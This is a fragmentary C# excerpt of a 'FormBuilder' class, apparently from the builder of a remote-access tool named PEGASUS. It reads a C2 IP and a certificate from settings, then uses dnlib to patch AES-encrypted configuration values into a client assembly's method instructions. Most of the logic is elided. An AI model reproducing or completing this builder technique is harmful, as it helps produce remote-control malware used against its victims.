...
public class FormBuilder : Form
{
	...
	private void BtnAddIP_Click(object sender, EventArgs e)
	{
		try
		{
			...
			textIP.Clear();
			textIP.Text = PEGASUS.Settings.IP;
		}
		catch
		{
		}
	...
	private void WriteSettings(ModuleDefMD asmDef, string AsmName)
	{
		try
		{
			...
			X509Certificate2 x509Certificate = new X509Certificate2(PEGASUS.Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
			...
			foreach (TypeDef type in asmDef.Types)
			{
				...
				foreach (MethodDef method in type.Methods)
				{
					...
					for (int i = 0; i < method.Body.Instructions.Count(); i++)
					{
						...
						{
							method.Body.Instructions[i].Operand = aes.Encrypt(PEGASUS.Settings.Version.Replace("PEGASUS ", ""));
						}
